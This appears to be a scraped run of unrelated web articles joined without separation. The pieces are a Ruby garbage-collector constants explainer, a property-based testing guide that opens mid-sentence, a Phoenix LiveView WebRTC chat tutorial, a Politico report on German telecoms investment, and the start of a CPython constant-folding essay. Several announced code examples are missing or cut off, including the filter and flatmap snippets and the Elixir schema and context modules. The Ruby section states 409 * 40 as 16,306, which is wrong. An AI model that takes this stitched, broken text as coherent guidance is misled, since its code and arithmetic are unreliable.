    <p>There’s an old saying that we can learn a lot about people by looking at their trash. The same can hold true about programming languages. More precisely, we can learn a lot about a programming language by looking at its garbage collection. This post kicks off a series of posts (and eventually a book) about Ruby’s GC.</p>

<p>Continuing with the (admitedly not great) metaphor here, we’ll start by looking at what is always in Ruby’s trash. Ruby exposes <a href="https://ruby-doc.org/core-3.0.0/GC.html"><code>GC::INTERNAL_CONSTANTS</code></a>, so we can see what is <em>constant</em> within the garbage collector.</p>

<h3 id="gcinternal_constants">GC::INTERNAL_CONSTANTS</h3>

<p>Printing out <code>GC::INTERNAL_CONSTANTS</code> in Ruby 3.0, we see the following:</p>

<div><div><pre><code><span>{</span>
  <span>:DEBUG</span><span>=&gt;</span><span>false</span><span>,</span>
  <span>:RVALUE_SIZE</span><span>=&gt;</span><span>40</span><span>,</span>
  <span>:HEAP_PAGE_OBJ_LIMIT</span><span>=&gt;</span><span>409</span><span>,</span>
  <span>:HEAP_PAGE_BITMAP_SIZE</span><span>=&gt;</span><span>56</span><span>,</span>
  <span>:HEAP_PAGE_BITMAP_PLANES</span><span>=&gt;</span><span>4</span><span>,</span>
  <span>:HEAP_PAGE_SIZE</span><span>=&gt;</span><span>16384</span>
<span>}</span>
</code></pre></div></div>

<p>We’ll go one by one through these constants, and in defining them, learn much more about how Ruby organizes its memory.</p>

<h4 id="debug--false">:DEBUG =&gt; FALSE</h4>

<p>This <code>:DEBUG</code> constant is really more useful for debugging writing Ruby source code than writing Ruby programs. Almost every Ruby program we run will have <code>:DEBUG =&gt; FALSE</code> so we don’t have to worry about it!</p>

<p>For the extremely curious, the only way <code>:DEBUG</code> is <code>TRUE</code> is if we compile Ruby source code with a cppflag setting <code>DGC_DEBUG</code> to true (see <a href="https://github.com/ruby/ruby/blob/66a844fd07ca0fd652a20a1973ea242422d4ae6d/.github/workflows/compilers.yml#L110">this example</a>). But, since most of the time we’re not compiling Ruby source code, it’ll almost always be <code>FALSE</code>.</p>

<h4 id="rvalue_size--40">:RVALUE_SIZE =&gt; 40</h4>

<p>It’s important to first note that the units for all of these constants which end in <code>_SIZE</code> are bytes. So this constant is telling us that each <code>RVALUE</code> is 40 bytes.</p>

<p>Neat. But, it begs the question, what is an <code>RVALUE</code>? An <code>RVALUE</code> contains basic information about Ruby objects. <code>RVALUES</code> are C structs which are unions of various C representations of Ruby objects.</p>

<p>As part of this information, they either contain the actual values of Ruby objects, or, if the values are too large for the 40 byte limit, they contain pointers to where on the OS heap the Ruby object’s value lives.</p>

<p>(Small aside, strings with 23 characters or fewer have thier values stored inside <code>RVALUES</code>, while strings with more than 23 characters have their values stored on the OS Heap. Pat Shaughnessy has <a href="http://patshaughnessy.net/2012/1/4/never-create-ruby-strings-longer-than-23-characters">a fun blog post</a> explaining this nuance.)</p>

<h4 id="heap_page_obj_limit--409">:HEAP_PAGE_OBJ_LIMIT =&gt; 409</h4>

<p>Okay, next up, <code>HEAP_PAGE_OBJ_LIMIT</code>. 409 is the maximum number of objects per each <code>HEAP_PAGE</code>. But what is a <code>HEAP</code> and what is a <code>PAGE</code>?</p>

<p>The Ruby <code>HEAP</code> is Ruby’s entire Object Space, or memory. It is where all of our <code>RVALUES</code> live. The <code>HEAP</code> is segmented into <code>PAGES</code>. When the garbage collector needs more memory, it doesn’t request new memory for each individual object from the OS. As we learned above with the <code>RVALUE_SIZE</code>, this would mean requesting more memory in 40 byte segments, which would be wildly inefficient.</p>

<p>Instead, when the <code>HEAP</code> needs more memory, it requests an entire new <code>PAGE</code>. These pages each contain up to 409 objects. Some pages contain slightly fewer than 409 objects; Aaron Patterson has <a href="https://tenderlovemaking.com/2017/09/27/visualizing-your-ruby-heap.html">a great blog post</a> which explains why. But, as this constant tells us, 409 is the upper limit of objects (or <code>RVALUE</code>s) per page.</p>

<h4 id="heap_page_bitmap_size--56">:HEAP_PAGE_BITMAP_SIZE =&gt; 56</h4>

<p>We now know <code>HEAP</code> and <code>PAGE</code>, but what is the <code>BITMAP</code>? Well, each <code>HEAP_PAGE</code> also has a representation of its objects in a bitmap. Each object is represented by one bit.</p>

<p>Okay, so this bitmap takes up 56 bytes of memory. The math here checks out. There are 8 bits in a byte. Which means with our 56 bytes we have access to <code>56 * 8 == 448</code> objects which will safely cover all of the 409 objects we want to represent.</p>

<p>But, I still haven’t answered the question of why we need these bitmaps to represent all of the objects in the first place. This is <em>integral</em> to the actual algorithm Ruby uses for garbage collection. It’s a tri-color mark and sweep algorithm. The details of this algorithm deserve at least one of their own entire blog posts. (When I’ve written that, I’ll link it here.) For now, you’re just going to have to trust that it’s important this bitmap exists per page, and has enough space for each object within a page.</p>

<h4 id="heap_page_bitmap_planes--4">:HEAP_PAGE_BITMAP_PLANES =&gt; 4</h4>

<p>I must admit, this one stumped me. So I <a href="https://github.com/ruby/ruby/search?q=HEAP_PAGE_BITMAP_PLANES">searched the Ruby source code</a>, found where it is set to 4, but absolutely no use of the variable itself. As far as I can tell, this value is unused. I then, admitedly, dove deep into a nostalgic-for-travel googling of airplanes.</p>

<p>Anyways, back to the matter at hand, if anyone knows what <code>HEAP_PAGE_BITMAP_PLANES</code> means, please, please let me know, I am super curious to learn! I have a hunch that it is remnants from an older Ruby version….</p>

<h4 id="heap_page_size--16384">:HEAP_PAGE_SIZE =&gt; 16384</h4>

<p>Lastly, we have the size of the pages themselves. 16384 bytes means each page is a little over 16KB. These pages have headers with some information, and then all of their <code>RVALUES</code>. The spaces where the <code>RVALUES</code> are stored are called slots. So above, when we said the <code>HEAP_PAGE_OBJECT_LIMIT</code> was 409, another way to frame this would have been that each page has a maximum of 409 slots.</p>

<p>Again, we can check the math here. There should be enough space within each page for all of its <code>RVALUES</code>, and a little extra for the header information. We know each page has a maximum of 409 <code>RVALUES</code>, and each <code>RVALUE</code> is 40 bytes. So <code>409 * 40 == 16,306 &lt; 16384</code>.</p>

<h3 id="tldr">TL;DR</h3>

<p>For any visual learners, here’s a diagram explaining the above:</p>

<p><img src="https://jemma.dev/assets/heap-diagram.png" alt="Heap diagram"></p>

<p>And here’s a quick definition-based summary:</p>

<ul>
  <li><strong>Heap</strong> (Variable size): Ruby’s Object Space, or memory. Where Ruby stores all of its Pages.</li>
  <li><strong>Page</strong> (~16 KB): How Ruby segments its Heap. Heaps contain pages. Pages contain at most 409 slots.</li>
  <li><strong>Slot</strong> (40 bytes): A space on a Page where an RVALUE is stored</li>
  <li><strong>RVALUE</strong> (40 bytes): Ruby’s C representation of objects. Sometimes contains the value of the object, sometimes contains a pointer to where the object lives in the OS heap</li>
</ul>

<p>That’s all for this post! As I referenced earlier, I will be writing much more about garbage collection (both blog posts and a book!!). If you’re interested in following along and hearing when I have new posts, please leave your email address below.</p>

a description of some property of your system from a description of the domain
over which that property must hold. For example, if you're testing the
'addition' operation, you might what to check the <em>property</em> that it's
commutative (the output is the same, regardless of the order). The relevant
<em>domain</em> here is pairs of numbers.</p> <p><span>For the mathematically inclined, you can think of the property as being a proposition with some number of free variables, and the domains as binding each free variable with a universal quantifier.

you're new to this, I recommend trying to write at least one proptest, then
reading the advice below.</p> <p>This is not going to be a basic 'How to proptest' tutorial. There are many, many
treatments of that subject; you should probably start with the documentation for
your language's proptest library. A few of my favorites are:</p> <ul><li><a href="https://github.com/AltSysrq/proptest" target="_blank" rel="noopener noreferrer">proptest (Rust)</a> (We use this extensively at Auxon)</li> <li><a href="https://github.com/clojure/test.check" target="_blank" rel="noopener noreferrer">test.check (Clojure)</a></li> <li><a href="https://hypothesis.readthedocs.io/en/latest/" target="_blank" rel="noopener noreferrer">hypothesis (Python)</a></li></ul> <p>Property-based testing libraries are extensively available. There's probably one
you can use in your language of choice.</p> <h3 id="why-proptest"><a href="#why-proptest">#</a> Why Proptest?</h3> <p>Testing and specification can be thought of as a spectrum of rigor. On the
least-rigorous end, we have manual testing and regular written specifications.
Moving up, we find automated unit / integration test and executable
specification languages (like Cucumber, another popular tool at Auxon). Then
there's a massive gulf, and everything gets starts getting academic and
difficult; symbolic execution, model checking, and formal proofs show up at the far end.</p> <p><img src="https://blog.auxon.io/images/posts/effective-property-based-testing-1.png" alt="property-based"></p> <p>Proptests are somewhere in the middle, just a little past the tests you're
already doing. They're a very practical way of verifying your implementation
against a rigorous, executable specification. But they're not much harder to
write than the unit tests you're already doing.</p> <h3 id="terminology-check"><a href="#terminology-check">#</a> Terminology Check</h3> <p>Different proptest libraries use different words to talk about the same thing.
In this article, I'll use 'Generator' to talk about the thing that defines the
input domain for your proptest. (Some people refer to proptests as generative
testing). This is also known as a 'Strategy' in Rust proptest / Python
hypothesis parlance.</p> <p>Code examples will be written in Rust, but the concepts and recommendations
apply to any proptest framework.</p> <h2 id="write-em-compose-em-put-em-in-a-suite"><a href="#write-em-compose-em-put-em-in-a-suite">#</a> Write 'em, Compose 'em, Put 'em in a Suite</h2> <h3 id="item-1-develop-a-generator-library"><a href="#item-1-develop-a-generator-library">#</a> Item 1: Develop a Generator Library</h3> <p>Your program probably has a bunch of classes or data structures that it cares
about deeply, that are central to its operation and passed all around the
system. You should identify theses data structures and write generators for
them. You can do this incrementally, as you begin to work with proptests.</p> <h3 id="item-2-be-a-little-suspicious-of-type-based-generators"><a href="#item-2-be-a-little-suspicious-of-type-based-generators">#</a> Item 2: Be a little suspicious of type-based generators</h3> <p>Many proptest frameworks provide a way to make a generator directly from a
structure, type, or schema definition. These are of course very convenient, and
I've used them often. But they're not as clearly good as you might think.</p> <p>First, your types may not be as precise as what you need for your generators.
Maybe you have a single type which can have two distinct data variants (maybe
both valid and invalid requests?) which you want to generate separately. Second,
event if your type definition is fully precise, you may find that practical
execution considerations require you to make size or other input domain
restrictions in the generators. This happens fairly frequently.</p> <p>For these reasons, I recommend staying away for type-based generators for all
but the most simple applications. We've found that's it's best to just start
with standalone generators; it costs a little more up front, but I always end up
converting to them later on anyways. Clojure's <code>core.spec</code>-based generators are
an exception here, as they provide an ad-hoc way to override portions of the
generated generator. But even then, it's a fairly laborious process.</p> <h3 id="item-3-touch-test-your-generators"><a href="#item-3-touch-test-your-generators">#</a> Item 3: Touch-test your generators</h3> <p>When you're writing your generators, use your language's interactive execution
facilities to try them out. It's common to find unexpected variations in
proptest-generated data, and this can help you shortcut the "WHY did my tests
fail?" process. I've had a lot of success using this technique in Clojure.</p> <h3 id="item-4-learn-your-combinators"><a href="#item-4-learn-your-combinators">#</a> Item 4: Learn your Combinators</h3> <p>Proptest libraries are built from small generators that can be combined to form
more complex structures. Some of these are language/environment dependent, but
the important ones are common:</p> <ul><li><p>Primitive types - You'll start with generators for all the primitives in your
language: integers, floats, strings, etc.</p></li> <li><p>Collection types - Look for direct support for native collections in your
framework; you can use these to generate a collection of anything else you can
generate. Note that collection size can be bounded; you'll find this necessary
when developing larger compound generators.</p></li> <li><p><code>just</code> / <code>return</code> - Proptest frameworks always have a way to 'lift' a single
value, creating a generator that just spits out that value every time.</p></li> <li><p><code>map</code> - Transform a generated value in some way. You might use this to
generate numbers that have been converted to strings.</p></li> <li><p><code>filter</code> - Throw out generated values if they don't pass some test. This is
convenient but a little dangerous; see <a href="#filtering">below</a>.</p></li> <li><p><code>tuple</code> - Get data from multiple generators together. (This is kind of like
'and')</p></li> <li><p><code>one of</code> / <code>choose</code> - Get data from one of the given generators. (This is kind
of like 'or')</p></li> <li><p>data structures - Different frameworks approach this differently, but most
provide some amount of sugar to help you generate native data structures.
Lacking that, one effective strategy is to start with a <code>tuple</code> generator with
one item for each field in your data structure, then use <code>map</code> generator to
put them all together.</p></li> <li><p>recursive structures - If you want to generate a tree or some other kind of
recursive data structure, look for direct support for that in your framework.</p></li></ul> <h3 id="item-5-prefer-constructive-generation-to-filtering"><a href="#item-5-prefer-constructive-generation-to-filtering">#</a> Item 5: Prefer Constructive Generation to Filtering</h3> <p>The <code>filter</code> combinator is really easy, and one of the first things people
reach for when writing proptests for the first time. The trouble with this
is that it's inefficient, and it can break down entirely when used broadly.</p> <p>Suppose you wanted to make a generator for even numbers. It's easy to do with <code>filter</code>:</p> <p>This works, but it's doing a lost of wasted work: half of all the numbers
generated by the first step will be thrown out. Suppose you did the same thing
to generate multiples of 10: you'll be throwing away 90% of your work. Powers of
two? That's way out of hand. Most proptest frameworks will abort execution if
they aren't able to generate a valid sample after some number of tries.</p> <p>This is not only a problem with single value generators: you'll find that as you
start to combine generators to produce more complex structures, the effects of
multiple filter-based generators will accumulate, and you'll be aborting
execution all the time.</p> <p>The solution to this is to instead build your generators constructively. Start
with a fully specified domain, then transform that to get what you want. This
can be tricky, and sometimes requires oblique thinking to get it right. In the
case of our even numbers, it's not too bad:</p> <p>This is not a hard-and-fast rule; there are plenty of times where <code>filter</code> is
the only choice. But you should beware of your <code>filter</code>'s selectivity, and be
careful of using it too much.</p> <h3 id="item-6-use-flatmap-bind-for-data-dependencies"><a href="#item-6-use-flatmap-bind-for-data-dependencies">#</a> Item 6: Use flatmap/bind for Data Dependencies</h3> <p>Many data structures have some kind of internal consistency requirement. For
example, you might have a record that contains a vector of strings, and an index
into that list representing a cursor. We'd like to only generate valid cursors.
(Sometimes you want to generate <em>invalid</em> cursors as well, of course)</p> <p>The naive way to do this might be to start with a <code>tuple</code> of the vector
generator and a cursor generator, and then use <code>filter</code> to remove all tuples
where the cursor is out of bounds:</p> <p>This is a correct and succinct way to specify the constraint, but you'll find
that your proptest framework probably gives up after generating too many
candidates that don't match. It's radically inefficient at best.</p> <p>The constructive way to do this is to start with a generator for the list of
strings, and then use <code>flatmap</code> (or <code>bind</code>, the names vary) to generate an
in-bounds index:</p> <h3 id="item-7-bound-your-collections"><a href="#item-7-bound-your-collections">#</a> Item 7: Bound your collections</h3> <p>When you're making generators for collection-typed values (Vectors, Lists,
Maps, etc), it's tempting to say "do this for ALL the possible collections!" In
terms of specification, that's correct. But in terms of execution, it can get
out of hand. Does your system <em>really</em> need to be able to handle 200 million
distinct zip codes?</p> <p>This can get especially bad if you have compound data structures with collections nested under other collections. Even if your implementation can gracefully handle the load, you may find that your proptest framework cannot.</p> <p>You should carefully consider what you actually care about verifying,
and target that. I often choose a 'reasonable' (which depends on the context)
limit to the size of straight collections of simple values. When dealing with
nested collections, the "zero, one, many" rule of thumb applies; <code>many == 2 or 3</code> typically works well.</p> <h2 id="look-it-s-a-propiphaunt"><a href="#look-it-s-a-propiphaunt">#</a> Look! It's a Propiphaunt!</h2> <h3 id="item-8-start-small"><a href="#item-8-start-small">#</a> Item 8: Start small</h3> <p>When you're bringing proptest into a code base for the first time, it's tempting
to Specify All The Things. This is unfortunately a good way to fail. If you jump
into the deep end, you'll find that your proptests are mysteriously failing or
hanging in ways you can't explain. It's important to go at this incrementally as
you develop a feel for what kinds of generators your system needs, and what
kinds of properties you can feasibly verify.</p> <p>Start by proptesting your pure …</p></div></div>

          <section>
            <p>During this global pandemic, online video calls have become essential to the way we work. Millions of workers are now accustomed to hopping on calls with their colleagues to hash things out that they would previously have done in person. Zoom has shown itself to be a reliable partner for video conferencing. However, as a company, Zoom has given <a href="https://theintercept.com/2020/03/31/zoom-meeting-encryption/">plenty of</a> <a href="https://techcrunch.com/2019/07/10/apple-silent-update-zoom-app/">reasons to</a> <a href="https://www.theverge.com/2020/6/3/21279355/zoom-end-encryption-calls-fbi-police-free-users">avoid</a> <a href="https://www.npr.org/2020/06/12/876351501/zoom-acknowledges-it-suspended-activists-accounts-at-china-s-request">its software.</a></p>

<p>The world’s new reliance on video conferencing got me thinking: <em>How hard could it be to build a video conferencing web application?</em> Like most things worth doing, the answer was <em>difficult, but fun</em>.</p>

<p>When I first started researching for this project, I discovered that there isn’t much information out there about building a WebRTC-based application from start to finish. Mozilla’s WebRTC documentation is invaluable, but it lacked answers to some of the questions I had. And tutorials that exist generally only cover connecting two users in a fairly basic way. I wanted to do something more ambitious.</p>

<h2 id="what-were-going-to-build">What we’re going to build:</h2>

<p>In this article, we’re going to build a real-time video chat application with the following requirements:</p>

<ul>
  <li>The app will allow users to create video chat rooms with a unique slug, allowing any user to join.</li>
  <li>The app will keep track of which users are connected to the given room.</li>
  <li>The app will allow users to establish a group video call with eachother through WebRTC peer connections.</li>
</ul>

<p>Well, that sounds easy enough. Creating pages with central information on the fly in a web app is the bread and butter of any self-respecting web framework—and with Phoenix it’s a piece of cake. Tracking users seems a little tricky, but if you’ve heard of what LiveView and PubSub can do, you can probably guess that we’re still on the right track. WebRTC was designed for video calls, but group video calls? That might get complex. Plus, how would that even work if each of the connections is only peer-to-peer? We’ll get to that.</p>

<ul>
  <li><a href="https://littlechat.app/">We’ve wrapped up the finished product and deployed it at littlechat.app</a>. Try creating a room and hopping on it with a friend or two. That’s what we’re going to create.</li>
  <li><a href="https://github.com/littlelines/littlechat">You can also find the source code for this project here if you’re more of the self-guided type.</a></li>
</ul>

<h2 id="prerequisites">Prerequisites</h2>

<p>I’m going to assume that you are comfortable working with Elixir and Phoenix. I’ll assume that you might have toyed around with LiveView a few times before this article, but it doesn’t take much to get up to speed. Finally, I’ll assume you have no WebRTC experience beyond having heard about it a few times.</p>

<p>We will be using the latest versions of Elixir, Erlang, Phoenix, and Phoenix LiveView in this article, which are the following at the time of writing:</p>

<ul>
  <li>Elixir 1.10.3</li>
  <li>Erlang 23.0.2</li>
  <li>Phoenix 1.5.3</li>
  <li>Phoenix LiveView 0.13.3</li>
</ul>

<h2 id="the-tech">The Tech</h2>

<h3 id="webrtc">WebRTC</h3>

<p>Web Real Time Communication, or WebRTC for short, is a technology that allows real-time, peer-to-peer communication between users. It provides an API for handling user video, audio, and other data via peer-to-peer connections.</p>

<p>WebRTC has been around since 2011, but implementation by the various browsers has been uneven over the years. Nowadays, each browser has a more consistent WebRTC implementation, making browser support much better, but implementing it can still be a dance.</p>

<p>What makes WebRTC so flexible—and, at times, confounding—is that it has no standardized server-side implementation. WebRTC does not care how users in a video chat learn about each other and send their connection information, it only handles how to connect those users once their information has been sent. This originally confused me, as I was not sure where the server-side <em>signaling</em> (the WebRTC term for the process of telling two users about each other for a peer connection) ended and the <code>RTCPeerConnection</code> began. We’ll dig into this later.</p>

<h3 id="phoenix">Phoenix</h3>

<p>Elixir’s Phoenix framework allows us to build reliable and performant web applications built on Erlang’s rock-solid foundation. On any project, my first instinct these days is to reach for Phoenix. But the motivation goes deeper.</p>

<p>Elixir is built on Erlang’s VM, which was specifically developed for the challenges of the telecoms industry, where fault-tolerance and high-availability are essential. That sounds perfect for this project.</p>

<h3 id="liveview">LiveView</h3>

<p><a href="https://hexdocs.pm/phoenix_live_view/Phoenix.LiveView.html">LiveView</a> is one of my favorite components of Phoenix. It makes real-time user interaction between the client’s UI and the server seamless, without needing to write (much) JavaScript. LiveView makes real-time user interactions much easier to build and maintain, all while working within familiar concepts: Phoenix, Elixir, and OTP.</p>

<h2 id="getting-started">Getting Started</h2>

<p>Have you got all your tools ready? Let’s go!</p>

<p>First, we’re going to create a new Phoenix project with LiveView already configured. If you’re trying to add video chat to an existing app without LiveView already configured, <a href="https://hexdocs.pm/phoenix_live_view/installation.html#content">LiveView is pretty easy to set up from scratch too.</a> We’re going to call our project Littlechat, a portmenteau of Littlelines and chat.</p>

<div><pre><code><span>$ </span>mix phx.new littlechat --live</code></pre></div>

<p>Now let’s <code>cd littlechat</code> into our brand new app and install its dependencies.</p>

<div><pre><code><span>$ </span><span>cd </span>littlechat
<span>$ </span>mix deps.get
<span>$ </span>npm install --prefix assets</code></pre></div>

<p>Standard stuff. Let’s go a little deeper.</p>

<h2 id="creating-the-rooms">Creating the Rooms</h2>

<p>Users can’t connect to each other if they don’t have a place to meet, so let’s build them a room!</p>

<p>Let’s create a <em>context</em> called <code>Organizer</code> with a schema <code>Room</code>.</p>

<div><pre><code><span>$ </span>mix phx.gen.context Organizer Room rooms title:string slug:string</code></pre></div>

<p>That generated a few files for us, <code>lib/littlechat/organizer.ex</code>, <code>lib/littlechat/organizer/room.ex</code>, and a migration file ending in <code>XXXXX_create_rooms.exs</code> Let’s start with our Room schema.</p>

<p>Our rooms will only have two data to start, <code>slug</code> and <code>title</code>, both strings. <code>slug</code> will be the unique identifier for the room, so we’ll need to add a unique index to the database to prevent collisions. Let’s set up the database:</p>

<div><pre><code><span># priv/repo/migrations/XXXXX_create_rooms.exs</span>

<span>defmodule</span> <span>Littlechat.Repo.Migrations.CreateRooms</span> <span>do</span>
  <span>use</span> <span>Ecto.Migration</span>

  <span>def</span> <span>change</span> <span>do</span>
    <span>create</span> <span>table</span><span>(</span><span>"rooms"</span><span>)</span> <span>do</span>
      <span>add</span> <span>:slug</span><span>,</span> <span>:string</span>
      <span>add</span> <span>:title</span><span>,</span> <span>:string</span>

      <span>timestamps</span><span>()</span>
    <span>end</span>

    <span>create</span> <span>unique_index</span><span>(</span><span>:rooms</span><span>,</span> <span>:slug</span><span>)</span>
  <span>end</span>
<span>end</span></code></pre></div>

<p>For the schema, we’re going to create a basic changeset function with the added <code>unique_constraint</code> on slug. But we’re also going to add a private function, <code>format_slug/1</code> for the purpose of cleaning our slug input.</p>

<div><pre><code><span># lib/littlechat/room.ex</span>

<p>Great! Now we can create rooms in the database. What about getting one from the DB? Easy.</p>

<div><pre><code><span># lib/littlechat/organizer.ex</span>

<span>defmodule</span> <span>Littlechat.Organizer</span> <span>do</span>

<p>Now let’s build LiveViews for creating and viewing rooms.</p>

<p>We’re going to create two LiveViews, <code>LittlechatWeb.Room.NewLive</code> and <code>LittlechatWeb.Room.ShowLive</code>, the former for creating and the latter for showing the rooms. Let’s start with <code>NewLive</code>:</p>

  <li>Inside of this template, we create a basic form for creating a new Room. Note the reference to the <code>@changeset</code> assign.</li>
  <li>We then tell the form (via LiveView) to send the event <code>"validate"</code> to the server every time user input is added.</li>
  <li>Finally, we tell the form to send the event <code>"submit"</code>, along with the associated form data, to the server when the user makes a submit action (presses enter or clicks “Submit”).</li>

February 3, 2021 | https://www.politico.eu/article/germany-huawei-telecoms-plan/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/germany-huawei-telecoms-plan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
<p>The German government is preparing a massive investment plan to boost the development of local telecoms firms, in an effort to pivot away from dominant suppliers like China's Huawei.</p>



<p>The plan, dubbed the "joint proposal for action" by the ministries of interior, economy, research and transport, and seen by POLITICO, lays out how the government plans to spend €2 billion in funding from its larger coronavirus recovery stimulus program <a href="https://www.bundesregierung.de/breg-en/news/konjunkturpaket-1757640" target="_blank">presented in June</a>.</p>



<p>"The prosperity and competitiveness of Germany and Europe will increasingly depend on mastering new communication technologies," the proposal said, adding that this would "require a common political and industrial commitment at national and European level." </p>



<p>The plan comes as European governments increasingly take steps to box out Chinese tech giant Huawei from 5G-rollout plans due to security concerns. The restrictions mean telecoms operators have become more reliant on Sweden's Ericsson and Finland's Nokia, triggering calls from telecoms <a href="https://www.politico.eu/?p=1578702">operators</a> and some lawmakers to open up the supply chain to new players.</p>



<p>The German draft proposal includes over €300 million of investment in Open RAN technology, €237 million for a 6G research hub and €250 million to boost demand and expand 5G networks.</p>



<p>The draft also earmarked €550 million of German public investment in Europe's microchip market through a joint project, <a href="https://www.bmwi.de/Redaktion/DE/Pressemitteilungen/2021/02/20210202-gemeinsames-europaeisches-grossprojekt-zu-mikroelektronik-und-kommunikationstechnologien-geht-in-die-startbloecke.html" target="_blank">announced Tuesday</a>, between the government, the EU and local industry players.</p>



<p>The draft proposal was <a href="https://www.handelsblatt.com/technik/it-internet/open-ran-geheimpapier-milliarden-fuer-neue-mobilfunktechnik-sollen-abhaengigkeit-von-huawei-verringern/26830274.html?ticket=ST-5932468-7f1AIvazemqcyVbktwbi-ap6" target="_blank">first reported by Handelsblatt</a>.</p>



<h3>Looking for new 5G</h3>



<p>The government wants to prioritize "open RAN" technologies throughout its telecoms investment plan, a concept that would chop up the 5G supply chain into smaller pieces and break the market power of large end-to-end vendors like Huawei, Ericsson and Nokia.</p>



<p>Ericsson and Nokia "for long have held a globally good position," the text said, but "China is however technological frontrunner in 5G mobile networks." </p>



<p>"Germany and Europe need to urgently strengthen their competences and develop industrial ecosystems for Open RAN and 6G technologies, including hardware and software," it said.</p>



<p>The adoption of Open RAN could mean a blow for Ericsson and Nokia, which <a href="https://www.politico.eu/?p=1431389">have benefited</a> from the pushback against Huawei. But <a href="https://www.politico.eu/article/oran-reflow-huawei-europe-telecoms-5g/">the concept is heavily favored by telecoms operators</a>, who use the equipment and complain that they are too reliant on gear from the two European suppliers.</p>



<p>The plan seeks to facilitate "Germany's entry into technologies for Open RAN solutions," with hopes to establish new companies in niche markets like network integration and edge computing software.</p>



<p>These services and products are currently part of major contracts between operators and major vendors like Huawei, Ericsson and Nokia. </p>



<p>Experts have warned that the Open RAN technology is still immature and it could take years for these new types of networks to function as well as conventional 5G systems.</p>



<p>But the concept has gained influence in countries including the U.S. and the U.K., where lawmakers sought ways to replace Huawei.</p>



<p>In the European Union, Germany so far has been among the most eager to promote the concept — which is also heavily favored by its telecoms giant Deutsche Telekom as it looks to exit its <a href="https://www.politico.eu/article/deutsche-telekom-huawei-us-security-measures/">dependency on Huawei equipment</a>.</p>



<h3>Microchip plan</h3>



<p>Also on Tuesday, the German government said it wants to boost the German and European semiconductor industry with new EU, German and private investments to boost chip manufacturing and design firms.</p>



<p>“We want Germany and Europe to become more sovereign and independent of imports when it comes to microelectronics and communication technologies," Economy Minister Peter Altmaier said in a statement, announcing the <a href="https://www.bmwi.de/Redaktion/DE/Pressemitteilungen/2021/02/20210202-gemeinsames-europaeisches-grossprojekt-zu-mikroelektronik-und-kommunikationstechnologien-geht-in-die-startbloecke.html" target="_blank">government's plan</a> to launch a so-called Important Project of Common European Interest (IPCEI), elected projects that are set up to allow EU and national public funding to help private companies develop new technologies like microchips.. </p>



<p>The global semiconductor supply chain is dominated by U.S., Taiwanese, Chinese and Korean firms. Europe lags far behind in the supply of high-end chips, though it has a handful of companies that champion supply-chain niches like chip-printing machines and chips for cars.</p>



<p>The German call to launch an IPCEI project comes in the wake of <a href="https://www.dw.com/en/computer-chip-shortage-disrupts-global-car-production/a-56224486" target="_blank">warnings by its car industry</a> last month that a chip shortage was disrupting its production.</p>



<p>The European Commission is also working on a strategy to catch up on chips. It <a href="https://www.politico.eu/?p=1572339">launched discussions</a> with Europe’s leading firms in a bid to launch an “alliance” of firms, institutes and national governments to pool investments and set up joint projects this spring, including a manufacturing plant for high-end chips.</p>



<p><em>This article was updated to reflect that Important Projects of Common European Interest are approved under EU state aid rules.</em></p>

February 3, 2021 | https://arpitbhayani.me/blogs/constant-folding-python | <a href="https://web.archive.org/web/*/https://arpitbhayani.me/blogs/constant-folding-python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Every programming language aims to be performant in its niche and achieving superior performance requires a lot of compiler level optimizations. One famous optimization technique is <a href="https://en.wikipedia.org/wiki/Constant_folding">Constant Folding</a> where during compile time the engine tries to recognize constant expressions, evaluate them, and replaces the expression with this newly evaluated value, making the runtime leaner.</p>
<p>In this essay, we dive deep and find what exactly is Constant Folding, understand the scope of it in the world of Python and finally go through Python's source code - <a href="https://github.com/python/cpython/">CPython</a> - and find out how elegantly Python actually implements it.</p>

<p>In <a href="https://en.wikipedia.org/wiki/Constant_folding">Constant Folding</a>, the engine finds and evaluates constant expressions at compile time rather than computing them at runtime, making the runtime leaner and faster.</p>
<pre><code><span>&gt;&gt;&gt; </span>day_sec = <span>24</span> * <span>60</span> * <span>60</span>
</code></pre>
<p>When the compiler encounters a constant expression, like above, it evaluates the expression and replaces it with the evaluated value. The expression is usually replaced by the evaluated value in the <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Abstract Syntax Tree</a>, but the implementation is totally up to the language. Hence the above expression is effectively executed as</p>
<pre><code><span>&gt;&gt;&gt; </span>day_sec = <span>86400</span>
</code></pre>

<p>In Python, we could use the <a href="https://docs.python.org/3/library/dis.html#module-dis">Disassembler module</a> to get the CPython bytecode giving us a good peek at how things will be executed. When we disassemble the above constant expression using the <code>dis</code> module, we get the following bytecode</p>
<pre><code><span>&gt;&gt;&gt; </span><span>import</span> dis
<span>&gt;&gt;&gt; </span>dis.dis(<span>"day_sec = 24 * 60 * 60"</span>)

        <span>0</span> LOAD_CONST               <span>0</span> (<span>86400</span>)
        <span>2</span> STORE_NAME               <span>0</span> (day_sec)
        <span>4</span> LOAD_CONST               <span>1</span> (<span>None</span>)
        <span>6</span> RETURN_VALUE
</code></pre>
<p>We see that the bytecode, instead of having two binary multiply operations followed by one <code>LOAD_CONST</code>, is having just one <code>LOAD_CONST</code> with the already evaluated value of <code>86400</code>. This indicates that the CPython interpreter during parsing and building of Abstract Syntax Tree folded the constant expression, <code>24 * 60 * 60</code> and replaced it with the evaluated value <code>86400</code>.</p>
<h3>Scope of Constant Folding</h3>
<p>Python tries to fold every single constant expression present but there are some cases where even though the expression is constant, but Python chooses not to fold it. For example, Python does not fold <code>x = 4 ** 64</code> while it does fold <code>x = 2 ** 64</code>.</p>
<p>Apart from the arithmetic expressions, Python also folds expressions involving Strings and Tuples, where constant string expressions till the length <code>4096</code> are folded.</p>
<pre><code><span>&gt;&gt;&gt; </span>a = <span>"-"</span> * <span>4096</span>   
<span>&gt;&gt;&gt; </span>a = <span>"-"</span> * <span>4097</span>   
<span>&gt;&gt;&gt; </span>a = <span>"--"</span> * <span>4096</span>  
</code></pre>

<p>Now we shift our focus to the internals and find exactly where and how CPython implements Constant Folding. All AST optimizations, including Constant Folding, can be found in file <a href="https://github.com/python/cpython/blob/master/Python/ast_opt.c">ast_opt.c</a>. The base function starting it all is <code>astfold_expr</code> which folds any and every expression that Python source has. The function recursively goes through the AST and tries to fold every constant expression, as seen in the snippet below.</p>
